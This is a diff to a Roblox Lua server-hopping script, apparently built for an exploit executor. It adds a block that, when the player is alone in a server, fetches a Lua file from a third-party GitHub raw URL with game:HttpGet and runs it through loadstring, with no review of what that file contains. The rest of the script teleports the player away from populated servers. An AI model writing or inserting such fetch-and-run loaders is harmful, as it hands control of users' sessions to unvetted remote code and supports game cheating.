@@ -48,12 +48,13 @@ local function safeTeleport(placeId, jobId)
     TeleportService:TeleportToPlaceInstance(placeId, jobId, Players.LocalPlayer)
 end
 
--- Loop to detect new players joining
+-- Only load once per server session
+local loaderLoaded = false
+
 while true do
     local currentPlayers = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers
 
-    -- If someone else joined, hop
     if currentPlayers > MAX_PLAYERS_IN_TARGET then
         warn("Detected "..currentPlayers.." players in server! (target is "..MAX_PLAYERS_IN_TARGET..") Serverhopping...")
         local targetServer = findLowPopServer()
@@ -64,7 +65,15 @@ while true do
         end
         break -- stop the loop after teleporting!
     else
-        print("[Solo Server] Still alone! ("..currentPlayers..")")
+        if not loaderLoaded then
+            warn("You are in a server with "..currentPlayers.." player(s). Running loader.")
+            local success, result = pcall(function()
+                return loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/Loader/refs/heads/main/test.lua"))()
+            end)
+            print("Loader script executed!", success, result)
+            loaderLoaded = true
+        end
+        -- Only check every 3 seconds for new players
+        task.wait(3)
     end
-    task.wait(3)
 end
